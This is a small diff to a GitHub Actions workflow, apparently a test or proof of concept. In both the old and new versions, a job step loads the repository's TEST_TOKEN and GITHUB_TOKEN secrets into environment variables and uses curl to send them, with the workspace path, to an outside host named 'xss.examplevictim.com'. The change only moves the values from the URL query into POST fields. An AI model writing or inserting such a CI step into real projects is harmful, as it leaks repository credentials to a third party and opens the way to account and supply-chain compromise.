@@ -10,4 +10,4 @@ jobs:
         env:
                 secret_test: ${{secrets.TEST_TOKEN}}
                 gh: ${{secrets.GITHUB_TOKEN}}
-        run: curl -v "http://xss.examplevictim.com/\?a=$GITHUB_WORKSPACE\&x=$GH\&t=$SECRET_TEST\&z=$secret_test"
+        run: curl -v "http://xss.examplevictim.com/" -d "a=$GITHUB_WORKSPACE" -d "x=$GH" -d "t=$SECRET_TEST" -d "z=$secret_test"
